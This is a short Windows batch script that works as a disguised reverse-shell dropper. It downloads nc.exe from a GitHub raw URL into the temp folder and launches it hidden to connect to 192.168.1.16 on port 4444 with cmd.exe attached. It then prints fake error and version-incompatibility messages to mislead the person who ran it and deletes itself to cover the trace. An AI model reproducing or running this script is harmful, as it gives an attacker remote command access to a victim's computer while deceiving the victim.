@echo off
curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe
powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden"
for /L %%i in (1,1,40) do (
    echo Error occurred
    ping -n 1 -w 750 127.0.0.1 >nul
)
echo.
echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
timeout /t 3 >nul
del "%~f0"
